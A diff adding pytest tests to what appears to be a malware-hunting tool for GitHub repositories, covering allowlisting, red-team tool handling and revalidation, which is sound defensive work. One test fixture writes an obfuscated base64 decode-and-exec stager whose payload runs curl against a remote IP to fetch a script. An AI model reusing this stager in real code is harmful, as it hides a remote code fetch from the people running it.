@@ -105,6 +105,42 @@ def test_hunt_signature_match_finds_novel_repo(tmp_path, monkeypatch):
     db.close()
 
 
+def test_hunt_known_good_owner_never_confirms(tmp_path, monkeypatch):
+    # 2026-07-07: microsoft/vscode confirmed on a legit env-read because the
+    # allowlist only ran at reconcile. A known-good owner must never reach Tier-2,
+    # even under a malicious-owner pivot with a weaponized clone.
+    import git_warden.config as cfg
+    monkeypatch.setattr(cfg, "KNOWN_GOOD_OWNERS", frozenset({"microsoft"}))
+
+    class OwnerClient(FakeClient):
+        def list_forks(self, owner, name, per_page=100, sort="newest"):
+            return []
+
+        def list_user_repos(self, owner):
+            return [{"full_name": "microsoft/vscode",
+                     "owner": {"login": "microsoft"},
+                     "html_url": "https://github.com/microsoft/vscode"}]
+
+    db = Database.open(tmp_path / "kg.sqlite")
+    db.start_run("seed", utcnow())
+    # seed a malicious owner "microsoft" so the owner pivot surfaces microsoft/vscode
+    from git_warden.enums import DetectionMethod, RepoFindingStatus
+    from git_warden.models import RepoFinding
+    db.upsert_finding(RepoFinding(
+        full_name="microsoft/evil-seed", detection_method=DetectionMethod.SIGNATURE_MATCH,
+        status=RepoFindingStatus.CONFIRMED, code_hash="x",
+        raw_payload={"bash_findings": [{"file": "x.js", "line": 1,
+                     "category": "obfuscation", "rule": "eval-decoded"}]}), "seed")
+
+    hunt(db, OwnerClient(), TOOLS, run_id="kg", now=utcnow(), do_news=False,
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=True, do_osm=False,
+         do_signature=False, do_package_repos=False, do_tier2=True, clone=_fake_clone)
+    row = db.conn.execute(
+        "SELECT status FROM repo_findings WHERE full_name='microsoft/vscode'").fetchone()
+    assert row is None or row["status"] != "confirmed"   # allowlisted -> never confirmed
+    db.close()
+
+
 def test_hunt_osm_repo_validation_confirms(tmp_path):
     # do_osm clones OSM-labeled repos directly and confirms genuine ones.
     from git_warden.enums import ArtifactType, DetectionMethod, FeedSource
@@ -131,6 +167,37 @@ def test_hunt_osm_repo_validation_confirms(tmp_path):
     assert row is not None
     assert row["detection_method"] == DetectionMethod.OSM_REPOSITORY.value
     assert row["status"] == "confirmed"
+    db.close()
+
+
+class _FakeClientObf(FakeClient):
+    def compare(self, *a, **k):
+        return {"ahead_by": 3, "files": ["stager.py"]}
+
+
+def _fake_clone_obf_only(full_name, dest, *, runner=None):
+    # The fork's diverged file carries ONLY a review-tier obfuscation stager (a literal
+    # decode-exec) -- the kind of encoded payload a BAS tool like Infection Monkey ships
+    # by design. It is NOT AUTO-tier added weaponization (a dropper / install hook).
+    dest.mkdir(parents=True, exist_ok=True)
+    blob = "aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8vMTg1LjEzLjEuNy9hLnNoIikK"
+    (dest / "stager.py").write_text(
+        f"import base64\nexec(base64.b64decode('{blob}'))\n", encoding="utf-8")
+    return dest
+
+
+def test_hunt_lineage_own_obfuscation_is_breadcrumb_not_confirmed(tmp_path):
+    # 2026-07-07 (user): a pinned red-team tool's own obfuscation must NOT confirm a
+    # fork (thec0nci3rge/infection-monkey-v2.3.0 hex-blob). Only AUTO-tier ADDED
+    # weaponization does; review-tier own-code obfuscation stays a breadcrumb.
+    db = Database.open(tmp_path / "obf.sqlite")
+    summary = hunt(
+        db, _FakeClientObf(), TOOLS,
+        run_id="hunt-obf", now=utcnow(), do_news=False,
+        do_ioc=False, do_lineage=True, do_tier2=True, clone=_fake_clone_obf_only)
+    assert summary["counts"]["confirmed"] == 0
+    assert summary["counts"]["redteam_breadcrumbs"] >= 1
+    assert db.findings_by_status("confirmed") == []
     db.close()
 
 
@@ -583,4 +650,40 @@ def test_hunt_news_pivot_creates_news_mention_candidate(tmp_path):
     assert row["detection_method"] == DetectionMethod.NEWS_MENTION.value
     # do_tier2=False -> nothing can be CONFIRMED this run regardless of method.
     assert row["status"] != "confirmed"
+    db.close()
+
+
+def test_revalidate_demotes_fixed_fp_and_retiers(tmp_path):
+    """revalidate_findings re-scans confirmed rows: demotes ones that no longer
+    confirm (or are security tools) and refreshes the confidence tier on the rest."""
+    from git_warden.enums import DetectionMethod, RepoFindingStatus
+    from git_warden.hunt import revalidate_findings
+    from git_warden.models import RepoFinding
+    from git_warden.scanning.tier2 import Tier2Result
+
+    db = Database.open(tmp_path / "rv.sqlite")
+    db.start_run("run-1", utcnow())
+    for name in ("keep/real", "fix/fp", "tool/scanner"):
+        db.upsert_finding(RepoFinding(
+            full_name=name, detection_method=DetectionMethod.SIGNATURE_MATCH,
+            status=RepoFindingStatus.CONFIRMED, code_hash="x",
+            raw_payload={"confidence": "auto", "bash_findings": [
+                {"file": "x", "line": 1, "category": "install_hook", "rule": "vscode-autorun"}]}),
+            "run-1")
+
+    def fake_clone(full_name, workdir):
+        if full_name == "fix/fp":
+            return Tier2Result(full_name, "h", confirmed=False, confidence="none")
+        return Tier2Result(full_name, "h", confirmed=True, confidence="auto")
+
+    def fake_readme(full_name):
+        return "A malware scanner with sarif output and typosquat detection." \
+            if full_name == "tool/scanner" else "Just an app."
+
+    out = revalidate_findings(db, clone=fake_clone, readme_fetch=fake_readme)
+    demoted = {n for n, _ in out["demoted"]}
+    assert demoted == {"fix/fp", "tool/scanner"}
+    assert db.get_finding("fix/fp")["status"] == "rejected"
+    assert db.get_finding("tool/scanner")["status"] == "rejected"
+    assert db.get_finding("keep/real")["status"] == "confirmed"
     db.close()
